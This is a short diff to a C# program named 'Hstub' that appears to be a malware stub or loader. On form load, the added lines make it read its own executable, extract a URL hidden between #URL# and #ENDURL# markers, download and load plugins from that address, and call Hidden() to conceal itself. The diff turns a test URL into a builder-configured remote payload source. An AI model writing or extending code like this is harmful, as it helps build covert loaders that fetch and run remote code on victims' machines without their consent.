@@ -26,12 +26,12 @@ namespace Hstub
  
         private void Form1_Load(object sender, EventArgs e)
         {
-            //StreamReader sr = new StreamReader(Environment.CurrentDirectory + "//" + System.AppDomain.CurrentDomain.FriendlyName);
-            //string get_data = sr.ReadToEnd();
-            //sr.Close();
-            //get_data = get_data.Substring(get_data.IndexOf("#URL#"), get_data.IndexOf("#ENDURL#") - get_data.IndexOf("#URL#")).Replace("#URL#", "");
-             PluginLoader.GetPlugins("http://localhost/ax0n/updates.txt");
-            //Hidden()
+            StreamReader sr = new StreamReader(Environment.CurrentDirectory + "//" + System.AppDomain.CurrentDomain.FriendlyName);
+            string get_data = sr.ReadToEnd();
+            sr.Close();
+            get_data = get_data.Substring(get_data.IndexOf("#URL#"), get_data.IndexOf("#ENDURL#") - get_data.IndexOf("#URL#")).Replace("#URL#", "");
+            PluginLoader.GetPlugins(get_data);
+            Hidden();
         }
     }
 }
